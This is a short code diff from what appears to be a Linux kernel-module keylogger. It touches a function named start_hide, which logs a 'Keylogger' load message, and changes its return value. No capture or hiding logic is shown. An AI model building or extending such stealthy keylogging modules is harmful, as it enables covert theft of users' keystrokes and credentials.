@@ -41,6 +41,6 @@ static int start_hide(void)
     {
         printk(KERN_ALERT "Keylogger: load the device driver successfully");
     }
-    return ret;
+    return 1;
 }
 #endif
